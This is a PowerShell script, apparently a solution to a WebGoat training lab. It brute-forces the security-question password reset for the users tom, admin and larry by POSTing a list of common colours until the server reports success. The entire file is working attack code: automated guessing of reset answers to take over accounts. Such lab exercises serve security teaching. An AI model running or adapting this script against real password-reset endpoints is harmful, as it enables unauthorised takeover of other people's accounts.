# Security Questions Password Recovery Attack
# Target: Brute force password recovery for users tom, admin, larry

$baseUrl = "http://192.168.254.112:8001"
$endpoint = "/WebGoat/PasswordReset/questions"

# Common colors list (security question: "What is your favorite color?")
$colors = @(
    "red", "blue", "green", "yellow", "orange", "purple", "pink", 
    "black", "white", "gray", "grey", "brown", "cyan", "magenta",
    "violet", "indigo", "turquoise", "gold", "silver", "crimson",
    "navy", "teal", "lime", "maroon", "olive", "aqua", "fuchsia",
    "coral", "salmon", "peach", "mint", "lavender", "tan", "beige"
)

# Target users
$users = @("tom", "admin", "larry")

Write-Host "=======================================" -ForegroundColor Cyan
Write-Host "Security Questions Brute Force Attack" -ForegroundColor Cyan
Write-Host "=======================================" -ForegroundColor Cyan
Write-Host ""

foreach ($user in $users) {
    Write-Host "[*] Attempting to recover password for user: $user" -ForegroundColor Yellow
    Write-Host ""
    
    $found = $false
    
    foreach ($color in $colors) {
        Write-Host "  [+] Trying color: $color" -NoNewline
        
        $body = @{
            "username" = $user
            "securityQuestion" = $color
        } | ConvertTo-Json
        
        try {
            $response = Invoke-WebRequest -Uri "$baseUrl$endpoint" `
                -Method POST `
                -ContentType "application/json" `
                -Body $body `
                -UseBasicParsing
            
            $result = $response.Content | ConvertFrom-Json
            
            # Check if successful
            if ($result.feedback -or $result.lessonCompleted -or $result.output) {
                Write-Host " -> SUCCESS!" -ForegroundColor Green
                Write-Host ""
                Write-Host "  [!] FOUND PASSWORD for $user!" -ForegroundColor Green
                Write-Host "  [!] Security Answer: $color" -ForegroundColor Green
                
                if ($result.feedback) {
                    Write-Host "  [!] Feedback: $($result.feedback)" -ForegroundColor Green
                }
                if ($result.output) {
                    Write-Host "  [!] Output: $($result.output)" -ForegroundColor Green
                }
                
                Write-Host ""
                $found = $true
                break
            }
            else {
                Write-Host " -> Failed" -ForegroundColor Red
            }
        }
        catch {
            Write-Host " -> Error: $($_.Exception.Message)" -ForegroundColor Red
        }
        
        Start-Sleep -Milliseconds 100  # Small delay to avoid overwhelming server
    }
    
    if (-not $found) {
        Write-Host "  [-] No password found for $user with common colors" -ForegroundColor Red
    }
    
    Write-Host ""
    Write-Host "=======================================" -ForegroundColor Cyan
    Write-Host ""
}

Write-Host "[*] Attack completed!" -ForegroundColor Cyan
